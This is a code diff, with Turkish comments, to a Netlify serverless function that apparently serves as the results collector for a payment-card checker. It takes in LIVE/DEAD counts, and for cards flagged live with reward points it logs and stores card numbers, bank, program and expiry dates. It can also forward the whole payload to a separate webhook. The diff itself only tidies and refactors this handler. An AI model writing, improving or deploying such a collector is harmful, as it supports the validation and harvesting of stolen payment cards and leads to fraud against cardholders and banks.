@@ -1,28 +1,14 @@
 /**
  * Netlify Serverless Function — kart sonuçlarını alır ve saklar.
- *
  * Endpoint: POST /.netlify/functions/cards
- *
- * Kurulum:
- *   1. Bu dosyayı projenizin netlify/functions/ klasörüne koyun.
- *   2. Netlify dashboard → Site settings → Environment variables:
- *      SECRET_KEY = istediğiniz gizli anahtar (arvpuan'da secret= ile eşleşmeli)
- *   3. Netlify'a deploy edin.
- *
- * Opsiyonel — sonuçları bir yere kaydetmek için:
- *   - Netlify Blobs (ücretsiz, built-in key-value store) kullanılır.
- *   - Veya WEBHOOK_FORWARD_URL env değişkeni ile başka bir servise iletebilirsiniz.
  */
 
-const { getStore } = require("@netlify/blobs");
-
 exports.handler = async (event) => {
-  // Sadece POST kabul et
   if (event.httpMethod !== "POST") {
     return { statusCode: 405, body: "Method Not Allowed" };
   }
 
-  // Secret doğrulama (opsiyonel ama önerilir)
+  // Secret doğrulama
   const secret = process.env.SECRET_KEY;
   if (secret) {
     const incoming = event.headers["x-secret"] || "";
@@ -38,36 +24,36 @@ exports.handler = async (event) => {
     return { statusCode: 400, body: "Invalid JSON" };
   }
 
-  // Özet mesajı mı, kart sonucu mu?
+  // Özet mesajı
   if (payload.type === "summary") {
-    console.log(
-      `[SUMMARY] LIVE:${payload.live} DEAD:${payload.dead} ERR:${payload.error}`
-    );
+    console.log(`[SUMMARY] LIVE:${payload.live} DEAD:${payload.dead} ERR:${payload.error}`);
     return { statusCode: 200, body: JSON.stringify({ ok: true, type: "summary" }) };
   }
 
-  // Sadece LIVE kartları kaydet (success && has_points)
+  // Sadece LIVE kartları işle
   if (!payload.success || !payload.has_points) {
     return { statusCode: 200, body: JSON.stringify({ ok: true, skipped: true }) };
   }
 
-  // Netlify Blobs'a kaydet
+  const entry = {
+    card:     payload.card,
+    points:   payload.formatted,
+    bank:     payload.bank,
+    program:  payload.program,
+    expiry:   payload.expiry,
+    saved_at: new Date().toISOString(),
+  };
+
+  console.log(`[LIVE] ${entry.card} | ${entry.points} | ${entry.bank}`);
+
+  // Netlify Blobs'a kaydet (opsiyonel, hata olursa atla)
   try {
+    const { getStore } = require("@netlify/blobs");
     const store = getStore("live-cards");
     const key   = `${Date.now()}-${payload.card || "unknown"}`;
-    await store.setJSON(key, {
-      card:      payload.card,
-      points:    payload.formatted,
-      bank:      payload.bank,
-      program:   payload.program,
-      expiry:    payload.expiry,
-      saved_at:  new Date().toISOString(),
-    });
-    console.log(`[LIVE] ${payload.card} | ${payload.formatted} | ${payload.bank}`);
+    await store.setJSON(key, entry);
   } catch (err) {
-    // Blobs yoksa sadece logla
-    console.log(`[LIVE] ${payload.card} | ${payload.formatted} | ${payload.bank}`);
-    console.error("Blobs error:", err.message);
+    console.log("Blobs kayit atlandi:", err.message);
   }
 
   // Başka bir webhook'a ilet (opsiyonel)
@@ -80,7 +66,7 @@ exports.handler = async (event) => {
         body:    JSON.stringify(payload),
       });
     } catch (err) {
-      console.error("Forward error:", err.message);
+      console.error("Forward hatasi:", err.message);
     }
   }
 
